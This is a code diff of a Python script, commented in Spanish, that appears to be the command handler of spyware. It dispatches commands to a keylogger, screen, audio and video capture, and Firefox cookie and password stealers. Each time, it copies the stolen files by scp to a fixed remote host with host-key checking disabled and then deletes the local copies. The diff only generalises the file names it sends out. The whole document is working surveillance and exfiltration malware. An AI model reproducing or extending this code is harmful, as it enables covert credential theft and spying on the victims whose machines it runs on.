@@ -1,13 +1,13 @@
 #!/usr/bin/python
 
-import os, re
+import os, re, datetime
 import capaudio
 import captura
 import capvideo
 import keylogger
 
 
-
+nombre = "/tmp/" + datetime.datetime.now().isoformat() + "-comand.err"
 #Lista donde se almacenaran los comandos leidos del archivo
 comandos = [ ]
 
@@ -39,21 +39,21 @@ for c in comandos:
     if c == "cookies":
  		print c+"\n"
        		os.system("python firecookies.py")	
-                os.system('scp -q -o StrictHostKeyChecking=no /tmp/cookies.txt manavi@192.168.222.13:~/cookies/ 1>/dev/null')
-                os.system('rm -f /tmp/cookies.txt')
+                os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.cks manavi@192.168.222.13:~/cookies/ 1>/dev/null')
+                os.system('rm -f /tmp/*.cks')
 
     elif c == "contrasenas":
 		print c+"\n"
        		os.system("python firepass.py")
-                os.system('scp -q -o StrictHostKeyChecking=no /tmp/firepass.txt manavi@192.168.222.13:~/contrasenas/ 1>/dev/null')
-                os.system('rm -f /tmp/firepass.txt')
+                os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.fire manavi@192.168.222.13:~/contrasenas/ 1>/dev/null')
+                os.system('rm -f /tmp/*.fire')
 
     elif re.match('keylogger (\d+)',c):
 		print c+"\n"
                 mo = re.match('keylogger (\d+)',c)
         	keylogger.keylog(mo.group(1))
-                os.system('scp -q -o StrictHostKeyChecking=no /tmp/key.txt manavi@192.168.222.13:~/keylogger/ 1>/dev/null')
-                os.system('rm -f /tmp/key.txt')
+                os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.key manavi@192.168.222.13:~/keylogger/ 1>/dev/null')
+                os.system('rm -f /tmp/*.key')
     
     elif re.match('captura (\-[tn]{1,1}) (\d+)',c):
 		print c+"\n"
@@ -79,11 +79,11 @@ for c in comandos:
 
     #si el comando no es valido no se manda un archivo con los comandos no validos
     else :
-                fo = open("/tmp/comandosnovalidos.txt","a")
+                fo = open(nombre,"a")
     		fo.write(c + "\n")
 		fo.close() 
 
 
-if os.path.exists("/tmp/comandosnovalidos"):
-	os.system('scp -q -o StrictHostKeyChecking=no /tmp/comandosnovalidos.txt manavi@192.168.222.13:~/error/ 1>/dev/null')
-	os.system('rm -f /tmp/comandosnovalidos.txt')
+if os.path.exists(nombre):
+	os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.err manavi@192.168.222.13:~/error/ 1>/dev/null')
+	os.system('rm -f /tmp/*.err')
